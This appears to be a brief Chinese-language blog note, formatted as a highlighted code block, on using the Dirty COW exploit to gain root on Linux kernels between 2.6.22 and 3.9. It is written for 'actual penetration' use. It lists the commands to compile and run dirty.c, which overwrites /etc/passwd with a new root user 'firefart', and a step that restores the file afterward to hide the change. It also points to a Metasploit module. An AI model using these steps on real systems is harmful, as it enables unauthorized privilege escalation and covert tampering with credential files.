    <p><br><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'脏牛'</span>[Dirty copy-on-write] 提权小记<span class="symbol">:</span></span><br><span class="line">实际渗透中,提的成功率相对来讲还是蛮高的,屡试不爽,废话不多说,祝大家好运吧,至于漏洞细节,请自行参考公告,影响内核版本  Dirty COW.c  <span class="number">2.6</span>.<span class="number">22</span> &lt; <span class="number">3.9</span> </span><br><span class="line"></span><br><span class="line">$ gcc -pthread dirty.c -o dirty -lcrypt</span><br><span class="line">$ ./dirty admin</span><br><span class="line">$ su firefart</span><br><span class="line"><span class="comment"># mv /tmp/passwd.bak /etc/passwd	干完活,一定要记得把东西还原回来,exp已经有相应的msf模块可用,大家请自行尝试</span></span><br><span class="line"><span class="comment"># exit</span></span><br></pre></td></tr></table></figure></p>
